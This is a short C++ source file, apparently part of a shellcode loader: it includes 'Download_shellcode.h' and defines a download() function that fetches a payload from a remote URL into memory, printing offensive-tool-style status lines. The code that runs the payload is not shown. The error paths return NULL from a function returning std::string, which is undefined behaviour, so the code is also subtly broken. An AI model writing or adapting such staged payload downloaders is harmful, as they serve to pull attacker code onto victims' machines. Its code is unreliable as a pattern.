#include "Download_shellcode.h"

struct ComInit
{
    HRESULT hr;
    ComInit() : hr(::CoInitialize(nullptr)) {}
    ~ComInit() { if (SUCCEEDED(hr)) ::CoUninitialize(); }
};

string download(const char URL[])
{
    ComInit init;
    string s;
    CComPtr<IStream> pStream;

    printf("[*] Downloading %s\n", URL);

    HRESULT hr = URLOpenBlockingStreamA(nullptr, URL, &pStream, 0, nullptr);
    if (FAILED(hr))
    {
        std::cout << "[-] ERROR: Could not connect. HRESULT: 0x" << std::hex << hr << std::dec << "\n";
        return NULL;
    }

    char buffer[4096];
    do
    {
        DWORD bytesRead = 0;
        hr = pStream->Read(buffer, sizeof(buffer), &bytesRead);

        if (bytesRead > 0)
        {
            s.append(buffer, bytesRead);
        }
    } while (SUCCEEDED(hr) && hr != S_FALSE);

    if (FAILED(hr))
    {
        std::cout << "[-] ERROR: Download failed. HRESULT: 0x" << std::hex << hr << std::dec << "\n";
        return NULL;
    }

    
    return s;
}